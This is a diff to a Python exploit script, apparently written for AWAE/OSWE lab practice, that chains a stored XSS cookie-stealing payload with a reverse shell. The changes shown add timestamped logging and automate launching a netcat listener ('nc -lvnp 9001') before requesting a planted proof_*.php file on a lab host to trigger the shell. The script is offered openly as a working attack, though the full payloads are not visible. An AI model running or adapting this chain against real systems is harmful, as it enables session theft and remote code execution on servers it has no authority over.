@@ -3,6 +3,8 @@
 ## https://github.com/wetw0rk/AWAE-PREP/tree/master/XSS%20and%20MySQL
 ## Base template for the python server is here: https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py
 
+## Good example for logging: https://docs.python.org/3/howto/logging.html#changing-the-format-of-displayed-messages
+
 #!/usr/bin/env python3
 """
 Very simple HTTP server in python for logging requests
@@ -16,6 +18,7 @@ import sys
 import random
 import socket
 from time import sleep
+import os
 
 
 # Class S to server as the http server handler to receive the requests with the admin cookie.
@@ -39,7 +42,7 @@ class S(BaseHTTPRequestHandler):
 
 # The exploit function that runs.
 def exploit(server_class=HTTPServer, handler_class=S, port=8080):
-    logging.basicConfig(level=logging.INFO)
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
     # 0. Send request to instantiate the stored XSS exploit that sends the admin cookie back to our server.
     logging.info('1. Stored XSS Payload: Sending...')
@@ -106,18 +109,20 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
         sys.exit("3. Reverse Shell: Didn't work...Exiting :(")
 
     # 4. Reverse Shell Listener
-    logging.info("4. Reverse Shell Command: Open up a reverse shell listener with \"nc -lvnp 9001\"")
+    logging.info("4. Reverse Shell Command: Opening up a reverse shell listener in another terminal...")
     sleep(2)
-    acknowledge = input("4. Reverse Shell Command: Enter in \"Ready\" to acknowledge your shell is open ->")
-    if acknowledge == "Ready":
-        logging.info("4. Reverse Shell Command: Sending reverse shell!")
-        sleep(2)
-        response = requests.get('http://192.168.0.228/css/proof_'+str(random_number)+'.php')
-        sys.exit("4. Reverse Shell Command: Reverse Shell Closed...Exiting")
-        sleep(2)
+    ## Open up a new terminal with the nc reverse shell listener.
+    netcat = 'xfce4-terminal -e "nc -lvnp 9001"'
+    from subprocess import call
+    call(netcat,shell=True)
+    sleep(2)
 
-    else:
-        logging.info("4. Reverse Shell Command: Didn't receive acknowledgement...Exiting")
+    ## Execute the reverse shell payload to send the reverse shell.
+    logging.info("4. Reverse Shell Command: Sending reverse shell!")
+    sleep(2)
+    response = requests.get('http://192.168.0.228/css/proof_'+str(random_number)+'.php')
+    sys.exit("4. Reverse Shell Command: Reverse Shell Closed...Exiting")
+    sleep(2)
 
 # Main function that runs when executing the script.
 if __name__ == '__main__':
